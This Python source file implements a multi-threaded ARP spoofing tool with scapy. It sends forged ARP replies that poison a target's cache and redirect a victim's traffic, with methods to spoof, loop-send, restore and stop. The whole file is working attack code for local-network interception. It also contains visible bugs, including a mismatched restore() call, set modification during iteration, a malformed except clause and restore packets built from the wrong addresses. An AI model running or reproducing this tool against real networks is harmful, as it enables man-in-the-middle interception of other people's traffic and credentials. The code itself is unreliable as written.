import time
import scapy.all as scapy
from threading import Thread, Event
from lib import logger as _

log = _.log

# execute arp spoofing (is Multi-threaded)
class Spoofer(Thread):
	pkts	= []
	targets = set()
	# We know our mac and ip already let save them
	def __init__(self, host, delay = 1):
		super(Spoofer, self).__init__()
		self.exit = Event()
		self.host = host
		self.delay = delay

	# restoring real MACs
	def restore(self):
		for t in self.targets:
			for v in t.victims:
				pkt = scapy.ARP(op=2, pdst=v.ip, hwdst=v.mac, psrc=self.host[0], hwsrc=self.host[1])
				scapy.send(pkt, verbose=False)
				t.victims.remove(v)
			self.targets.remove(t)

	# We'll send the packet to the target by pretending being the victim
	def spoof(self, victim, target):
		if not target in self.targets:
			self.targets.add(target)
		log.print("dst: {} {} src: {} {}".format(target.mac, target.ip, victim.ip, victim.mac))
		self.pkts.append(scapy.ARP(op=2, hwdst=target.mac, pdst=target.ip, psrc=victim.ip))

	# Thread routine
	def run(self):
		log.print("Start spoofing...")
		self.exit.clear()
		try:
			while not self.exit.is_set():
				for spoof in self.pkts:
					scapy.sendp(spoof, verbose=False)
				time.sleep(self.delay)
		except KeyboardInterrupt or self.exit.is_set():
			for key in self.targets:
				self.restore(key)

	# Fire the stop event
	def stop(self):
		log.print("ARP Spoofing stopping, waiting 1 second...")
		self.exit.set();
		time.sleep(1)